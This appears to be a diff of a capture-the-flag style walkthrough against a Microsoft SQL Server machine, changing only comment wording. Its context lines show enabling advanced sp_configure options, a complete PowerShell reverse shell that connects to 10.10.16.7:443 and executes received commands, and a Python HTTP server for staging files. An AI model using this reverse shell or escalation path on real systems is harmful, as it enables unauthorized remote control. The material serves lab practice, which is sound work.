@@ -178,7 +178,7 @@
 		  1 
           
 
-// Now we will want to enable to display all the avalible options configured at instance level in SQL. the command will allow any user to have access to sp_configure command and will expose advanced configurtatiom parameters to an untrusted user.
+// Now we want to enable to display all the avalible options configured at instance level in SQL. the command will allow any user to have access to sp_configure command and will expose advanced configurtatiom parameters to an untrusted user.
 
 
 	SQL> EXEC sp_configure 'Show Advanced Options', 1;
@@ -233,7 +233,7 @@
 	$client = New-Object System.Net.Sockets.TCPClient("10.10.16.7",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 
 
-// Now will we open http server using python for upload the file
+// Now we open http server using python for upload the file
 
 
 	$ sudo python3 -m http.server 1444
